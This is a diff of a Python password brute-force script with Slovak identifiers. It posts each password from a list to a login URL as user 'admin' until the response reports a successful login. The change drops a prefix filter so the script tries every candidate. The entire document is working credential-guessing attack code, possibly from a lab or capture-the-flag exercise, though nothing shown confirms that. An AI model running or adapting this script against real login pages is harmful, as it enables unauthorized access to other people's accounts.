@@ -13,14 +13,13 @@ najdene_heslo = None
 username = "admin"
 
 for heslo in hesla:
-    if heslo[0:3] == "xam":
-        print(heslo)
-        data = {'username': username, 'password': heslo}
-        odpoved = requests.post(url, data=data)
+    print(heslo)
+    data = {'username': username, 'password': heslo}
+    odpoved = requests.post(url, data=data)
 
-        if "Úspešne si sa prihlásil" in odpoved.text:
-            najdene_heslo = heslo
-            break
+    if "Úspešne si sa prihlásil" in odpoved.text:
+        najdene_heslo = heslo
+        break
 
 if najdene_heslo:
     print('Nájdené heslo:', najdene_heslo)
